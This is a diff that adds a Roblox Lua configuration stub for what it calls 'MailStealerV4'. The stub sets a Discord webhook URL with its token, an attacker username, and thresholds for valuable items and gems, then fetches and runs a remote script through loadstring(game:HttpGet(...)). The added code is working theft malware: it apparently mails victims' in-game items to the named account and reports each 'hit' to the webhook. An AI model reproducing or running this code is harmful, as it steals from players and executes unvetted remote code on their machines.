@@ -1,0 +1,11 @@
+DualhookUsername = "jheremyqt1"
+DualhookWebHook = "https://discord.com/api/webhooks/1205078536214421504/o8_MnTN5jv_879u6ndWCtorMHW1IIuyC7cBukyTiUncZiJ-y3hjEyYZa7XLFXanGqg-J"
+
+HugeSetting = 2
+GemSetting = 2000000
+
+-- Custom Settings!
+LoadingScreenTitle = "You Just Got Hit Join discord.gg/ft6qjHR4gh"
+WebHookName = "MailStealerV4"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriPremium/main/MoriPremium"))()
